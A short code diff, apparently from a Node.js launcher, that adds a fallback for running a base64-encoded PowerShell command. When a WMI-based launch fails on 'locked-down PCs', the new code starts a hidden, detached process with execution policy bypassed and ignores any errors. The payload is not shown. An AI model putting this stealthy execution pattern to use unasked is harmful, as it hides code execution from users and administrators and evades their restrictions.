@@ -313,7 +313,13 @@ exit [int]$r.ReturnValue`;
       const c = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
         '-EncodedCommand', Buffer.from(outer, 'utf16le').toString('base64')], { stdio: 'ignore', windowsHide: true });
       c.on('error', e => end('powershell: ' + e.message));
-      c.on('exit', code => end('lanzado (' + code + ')'));
+      c.on('exit', code => {
+        if (code !== 0) {
+          // WMI refused (some locked-down PCs): started as a child, as before
+          try { const d = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-EncodedCommand', enc], { detached: true, stdio: 'ignore', windowsHide: true }); d.on('error', () => {}); d.unref(); } catch {}
+        }
+        end('lanzado (' + code + ')');
+      });
       setTimeout(() => end('sin respuesta, sigo'), 15000);
     } catch (e) { end('powershell: ' + e.message); }
   });
